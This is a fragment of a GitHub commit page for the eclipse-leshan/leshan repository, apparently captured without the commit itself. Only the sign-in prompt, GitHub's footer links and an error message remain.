[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-leshan%2Fleshan%2Fcommit%2F4d3e63ac271a817f81fba3e3229c519af7a3049c) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


